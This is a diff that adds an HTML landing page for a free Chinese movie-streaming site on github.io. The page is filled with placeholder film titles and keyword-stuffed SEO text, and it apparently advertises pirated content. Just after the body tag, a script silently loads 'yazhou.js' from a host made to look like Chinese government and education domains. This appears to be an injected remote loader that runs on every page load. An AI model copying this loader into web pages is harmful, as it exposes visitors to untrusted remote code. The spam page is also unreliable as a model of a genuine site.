@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>草民电影网在线观看 - 免费高清电影在线观看平台</title>
+<meta name="description" content="草民电影网在线观看(caomindianyingwangzaixianguankan-app)提供最新高清电影、电视剧、综艺、动漫在线观看，免费流畅，尽在草民电影网在线观看。">
+<meta name="keywords" content="草民电影网在线观看,caomindianyingwangzaixianguankan-app,免费电影,高清电影,在线观看">
+<style>
+/* ===== 全局样式 ===== */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Microsoft YaHei", sans-serif;
+    background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+    color: #e0e0e0;
+    line-height: 1.6;
+    min-height: 100vh;
+}
+
+a {
+    text-decoration: none;
+    color: inherit;
+}
+
+/* ===== 头部 ===== */
+header {
+    background: rgba(0, 0, 0, 0.6);
+    backdrop-filter: blur(10px);
+    position: sticky;
+    top: 0;
+    z-index: 1000;
+    padding: 1rem 0;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+}
+
+.header-container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 1rem;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+}
+
+.logo {
+    font-size: 1.5rem;
+    font-weight: 700;
+    color: #ff6b6b;
+    text-shadow: 0 0 10px rgba(255, 107, 107, 0.5);
+}
+
+.logo span {
+    color: #feca57;
+}
+
+nav ul {
+    list-style: none;
+    display: flex;
+    gap: 1.5rem;
+}
+
+nav a {
+    color: #dfe6e9;
+    font-size: 0.95rem;
+    padding: 0.5rem 0.8rem;
+    border-radius: 20px;
+    transition: all 0.3s ease;
+}
+
+nav a:hover {
+    background: rgba(255, 107, 107, 0.2);
+    color: #ff6b6b;
+}
+
+/* ===== 英雄区 ===== */
+.hero {
+    text-align: center;
+    padding: 4rem 1rem 3rem;
+    background: radial-gradient(circle at center, rgba(255, 107, 107, 0.15), transparent 70%);
+}
+
+.hero h1 {
+    font-size: 2.2rem;
+    margin-bottom: 1rem;
+    color: #fff;
+    text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+}
+
+.hero h1 .highlight {
+    color: #ff6b6b;
+}
+
+.hero p {
+    font-size: 1.1rem;
+    max-width: 600px;
+    margin: 0 auto 2rem;
+    color: #b2bec3;
+}
+
+.hero .btn {
+    display: inline-block;
+    background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+    color: #fff;
+    padding: 0.8rem 2rem;
+    border-radius: 30px;
+    font-weight: 600;
+    box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
+    transition: transform 0.3s ease;
+}
+
+.hero .btn:hover {
+    transform: translateY(-3px);
+}
+
+/* ===== 栏目通用 ===== */
+.section {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 3rem 1rem;
+}
+
+.section-title {
+    text-align: center;
+    font-size: 1.8rem;
+    margin-bottom: 2rem;
+    color: #fff;
+    position: relative;
+}
+
+.section-title::after {
+    content: '';
+    display: block;
+    width: 60px;
+    height: 3px;
+    background: linear-gradient(90deg, #ff6b6b, #feca57);
+    margin: 0.5rem auto 0;
+    border-radius: 2px;
+}
+
+/* ===== 栏目1：最新电影 ===== */
+.movie-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+    gap: 1.5rem;
+}
+
+.movie-card {
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 12px;
+    overflow: hidden;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+}
+
+.movie-card:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+}
+
+.movie-poster {
+    width: 100%;
+    height: 220px;
+    background: linear-gradient(45deg, #2d3436, #636e72);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #b2bec3;
+    font-size: 0.9rem;
+}
+
+.movie-info {
+    padding: 0.8rem;
+}
+
+.movie-info h3 {
+    font-size: 0.95rem;
+    margin-bottom: 0.3rem;
+    color: #fff;
+}
+
+.movie-info p {
+    font-size: 0.8rem;
+    color: #b2bec3;
+}
+
+/* ===== 栏目2：电影分类 ===== */
+.category-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+    gap: 1rem;
+}
+
+.category-item {
+    background: rgba(255, 255, 255, 0.08);
+    border-radius: 10px;
+    padding: 1.5rem 1rem;
+    text-align: center;
+    transition: all 0.3s ease;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+}
+
+.category-item:hover {
+    background: rgba(255, 107, 107, 0.15);
+    border-color: #ff6b6b;
+}
+
+.category-item .icon {
+    font-size: 2rem;
+    margin-bottom: 0.5rem;
+}
+
+.category-item h3 {
+    font-size: 1rem;
+    color: #feca57;
+}
+
+/* ===== 栏目3：排行榜 ===== */
+.rank-list {
+    max-width: 800px;
+    margin: 0 auto;
+}
+
+.rank-item {
+    display: flex;
+    align-items: center;
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 10px;
+    padding: 1rem;
+    margin-bottom: 1rem;
+    transition: background 0.3s ease;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+}
+
+.rank-item:hover {
+    background: rgba(255, 255, 255, 0.1);
+}
+
+.rank-num {
+    font-size: 1.5rem;
+    font-weight: 700;
+    color: #ff6b6b;
+    width: 40px;
+    text-align: center;
+    flex-shrink: 0;
+}
+
+.rank-content {
+    flex: 1;
+    padding-left: 1rem;
+}
+
+.rank-content h3 {
+    font-size: 1rem;
+    color: #fff;
+    margin-bottom: 0.2rem;
+}
+
+.rank-content p {
+    font-size: 0.85rem;
+    color: #b2bec3;
+}
+
+/* ===== 栏目4：关于我们 ===== */
+.about-content {
+    max-width: 800px;
+    margin: 0 auto;
+    text-align: center;
+}
+
+.about-content p {
+    margin-bottom: 1rem;
+    color: #b2bec3;
+}
+
+.about-content .url {
+    display: inline-block;
+    background: rgba(255, 107, 107, 0.15);
+    color: #ff6b6b;
+    padding: 0.5rem 1rem;
+    border-radius: 8px;
+    font-family: monospace;
+    margin: 1rem 0;
+    border: 1px solid rgba(255, 107, 107, 0.3);
+}
+
+/* ===== 页脚 ===== */
+footer {
+    background: rgba(0, 0, 0, 0.8);
+    padding: 2rem 1rem;
+    text-align: center;
+    border-top: 1px solid rgba(255, 255, 255, 0.1);
+}
+
+footer p {
+    color: #636e72;
+    font-size: 0.85rem;
+    margin-bottom: 0.5rem;
+}
+
+footer a {
+    color: #ff6b6b;
+}
+
+/* ===== 响应式 ===== */
+@media (max-width: 768px) {
+    .header-container {
+        flex-direction: column;
+        gap: 1rem;
+    }
+
+    nav ul {
+        flex-wrap: wrap;
+        justify-content: center;
+        gap: 0.8rem;
+    }
+
+    .hero h1 {
+        font-size: 1.6rem;
+    }
+
+    .hero p {
+        font-size: 0.95rem;
+    }
+
+    .section {
+        padding: 2rem 1rem;
+    }
+
+    .section-title {
+        font-size: 1.4rem;
+    }
+
+    .movie-grid {
+        grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
+        gap: 1rem;
+    }
+
+    .movie-poster {
+        height: 180px;
+    }
+
+    .category-grid {
+        grid-template-columns: repeat(2, 1fr);
+    }
+
+    .rank-item {
+        padding: 0.8rem;
+    }
+
+    .rank-num {
+        font-size: 1.2rem;
+    }
+}
+
+@media (max-width: 480px) {
+    .logo {
+        font-size: 1.2rem;
+    }
+
+    nav a {
+        font-size: 0.85rem;
+        padding: 0.4rem 0.6rem;
+    }
+
+    .hero {
+        padding: 2.5rem 1rem 2rem;
+    }
+
+    .hero h1 {
+        font-size: 1.3rem;
+    }
+
+    .movie-grid {
+        grid-template-columns: repeat(2, 1fr);
+    }
+
+    .category-grid {
+        grid-template-columns: repeat(2, 1fr);
+    }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 头部 -->
+<header>
+    <div class="header-container">
+        <div class="logo">草民<span>电影网</span></div>
+        <nav>
+            <ul>
+                <li><a href="#home">首页</a></li>
+                <li><a href="#latest">最新电影</a></li>
+                <li><a href="#categories">电影分类</a></li>
+                <li><a href="#ranking">排行榜</a></li>
+                <li><a href="#about">关于我们</a></li>
+            </ul>
+        </nav>
+    </div>
+</header>
+
+<!-- 英雄区 -->
+<section class="hero" id="home">
+    <h1>欢迎来到 <span class="highlight">草民电影网在线观看</span></h1>
+    <p>草民电影网在线观看(caomindianyingwangzaixianguankan-app)为您提供海量高清电影、电视剧、综艺、动漫资源，免费在线观看，畅享极致观影体验。</p>
+    <a href="#latest" class="btn">立即观看</a>
+</section>
+
+<!-- 栏目1：最新电影 -->
+<section class="section" id="latest">
+    <h2 class="section-title">最新电影</h2>
+    <div class="movie-grid">
+        <div class="movie-card">
+            <div class="movie-poster">海报</div>
+            <div class="movie-info">
+                <h3>电影名称一</h3>
+                <p>2024 · 动作</p>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">海报</div>
+            <div class="movie-info">
+                <h3>电影名称二</h3>
+                <p>2024 · 科幻</p>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">海报</div>
+            <div class="movie-info">
+                <h3>电影名称三</h3>
+                <p>2024 · 喜剧</p>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">海报</div>
+            <div class="movie-info">
+                <h3>电影名称四</h3>
+                <p>2024 · 爱情</p>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">海报</div>
+            <div class="movie-info">
+                <h3>电影名称五</h3>
+                <p>2024 · 悬疑</p>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">海报</div>
+            <div class="movie-info">
+                <h3>电影名称六</h3>
+                <p>2024 · 动画</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目2：电影分类 -->
+<section class="section" id="categories">
+    <h2 class="section-title">电影分类</h2>
+    <div class="category-grid">
+        <div class="category-item">
+            <div class="icon">🎬</div>
+            <h3>动作电影</h3>
+        </div>
+        <div class="category-item">
+            <div class="icon">🚀</div>
+            <h3>科幻电影</h3>
+        </div>
+        <div class="category-item">
+            <div class="icon">😂</div>
+            <h3>喜剧电影</h3>
+        </div>
+        <div class="category-item">
+            <div class="icon">💕</div>
+            <h3>爱情电影</h3>
+        </div>
+        <div class="category-item">
+            <div class="icon">🔍</div>
+            <h3>悬疑电影</h3>
+        </div>
+        <div class="category-item">
+            <div class="icon">👻</div>
+            <h3>恐怖电影</h3>
+        </div>
+        <div class="category-item">
+            <div class="icon">🎭</div>
+            <h3>剧情电影</h3>
+        </div>
+        <div class="category-item">
+            <div class="icon">📺</div>
+            <h3>电视剧集</h3>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目3：排行榜 -->
+<section class="section" id="ranking">
+    <h2 class="section-title">热门排行榜</h2>
+    <div class="rank-list">
+        <div class="rank-item">
+            <div class="rank-num">1</div>
+            <div class="rank-content">
+                <h3>热播电影第一名</h3>
+                <p>草民电影网在线观看推荐 · 评分 9.5</p>
+            </div>
+        </div>
+        <div class="rank-item">
+            <div class="rank-num">2</div>
+            <div class="rank-content">
+                <h3>热播电影第二名</h3>
+                <p>草民电影网在线观看推荐 · 评分 9.2</p>
+            </div>
+        </div>
+        <div class="rank-item">
+            <div class="rank-num">3</div>
+            <div class="rank-content">
+                <h3>热播电影第三名</h3>
+                <p>草民电影网在线观看推荐 · 评分 9.0</p>
+            </div>
+        </div>
+        <div class="rank-item">
+            <div class="rank-num">4</div>
+            <div class="rank-content">
+                <h3>热播电影第四名</h3>
+                <p>草民电影网在线观看推荐 · 评分 8.8</p>
+            </div>
+        </div>
+        <div class="rank-item">
+            <div class="rank-num">5</div>
+            <div class="rank-content">
+                <h3>热播电影第五名</h3>
+                <p>草民电影网在线观看推荐 · 评分 8.5</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目4：关于我们 -->
+<section class="section" id="about">
+    <h2 class="section-title">关于我们</h2>
+    <div class="about-content">
+        <p><strong>草民电影网在线观看</strong>是一个专注于提供高清电影、电视剧、综艺、动漫在线观看的免费平台。</p>
+        <p>我们致力于为影迷提供最优质、最流畅的观影体验，每日更新最新影视资源。</p>
+        <p>网站名称：<strong>草民电影网在线观看</strong></p>
+        <div class="url">https://caomindianyingwangzaixianguankan-app.github.io</div>
+        <p>关键词：草民电影网在线观看、caomindianyingwangzaixianguankan-app</p>
+        <p>如有任何问题或建议，欢迎通过内页链接反馈。</p>
+    </div>
+</section>
+
+<!-- 页脚 -->
+<footer>
+    <p>&copy; 2024 草民电影网在线观看(caomindianyingwangzaixianguankan-app). All rights reserved.</p>
+    <p>网站网址：<a href="https://caomindianyingwangzaixianguankan-app.github.io">https://caomindianyingwangzaixianguankan-app.github.io</a></p>
+    <p>本网站仅提供影视信息展示，资源来自互联网，如有侵权请联系删除。</p>
+</footer>
+
+</body>
+</html>
